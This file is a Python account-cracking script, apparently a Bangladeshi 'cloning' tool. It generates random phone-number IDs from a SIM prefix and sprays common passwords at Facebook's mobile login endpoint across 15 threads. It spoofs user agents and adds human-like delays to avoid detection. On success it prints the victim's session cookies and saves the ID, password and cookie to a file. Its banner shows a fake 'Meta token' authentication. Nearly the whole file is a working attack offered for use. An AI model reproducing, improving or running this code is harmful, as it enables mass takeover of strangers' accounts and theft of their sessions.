import os, time, sys, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Professional Color Codes
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
R = '\033[1;31m' # Red
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Pink

loop = 0
ok = []
cp = []

# Meta Token Simulation based on Screenshot
META_TOKEN = "ghp_MalekJilaniRealLogicFixed2024"

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
| [✓] AUTH         : META-TOKEN ACTIVATED      |
| [✓] SPEED        : HUMAN-STEADY (REF-LOGIC)  |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    # Check Meta Authentication Logic
    print(f'{G}[✓] CONNECTING TO META DATABASE...')
    time.sleep(2)
    print(f'{G}[✓] ACCESS GRANTED | TOKEN: {META_TOKEN[:10]}****')
    print(f'{G}--------------------------------------------------')
    print(f'{G}[1] START UPDATED CLONING')
    print(f'[0] EXIT')
    opt = input(f'{Y}[?] SELECT : {W}')
    if opt == '1':
        cloning_start()
    else:
        sys.exit()

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE (e.g. 017): {W}')
    limit = int(input(f'{G}[+] CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[✓] TARGETING OK RESULTS WITH REAL COOKIES...{W}')
    print(f'{G}--------------------------------------------------{W}')

    with ThreadPool(max_workers=15) as pool:
        for _ in range(limit):
            # Real Refactor: Removed fake randint prints
            num = "".join(random.choice("0123456789") for _ in range(8))
            uid = code + num
            # Password priorities from successful screenshot
            pws = [uid[-6:], uid, '786786', '123456', 'Bangladesh'] 
            pool.submit(login_engine, uid, pws, limit)

def login_engine(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{W}[STEADY] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        # Human-like delay logic
        time.sleep(random.uniform(1.5, 3.0)) 
        
        session = requests.Session()
        # High-Quality Real Header Setup
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://m.facebook.com/login/',
            'user-agent': ua,
            'x-fb-lsd': 'AVpY',
        }
        
        # Rafi Sar's Async Response URL
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY",
            "jazoest": "2931",
            "m_ts": str(int(time.time())),
            "email": uid,
            "pass": pas
        }

        try:
            # Capturing Real Response
            response = session.post(url, data=data, headers=headers, timeout=30)
            cookies = session.cookies.get_dict()
            
            # Extracting full cookies as shown in OK results
            if "c_user" in cookies:
                full_cookie = ";".join([f"{k}={v}" for k, v in cookies.items()])
                print(f'\n{G}[SUCCESS-OK💚] {uid} • {pas}') 
                print(f'{G}[🍪] COOKIE = {full_cookie}\n')
                ok.append(uid)
                with open('/sdcard/ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{full_cookie}\n')
                break
            elif "checkpoint" in cookies:
                cp.append(uid)
                break
        except:
            pass
            
    loop += 1

if __name__ == "__main__":
    main()
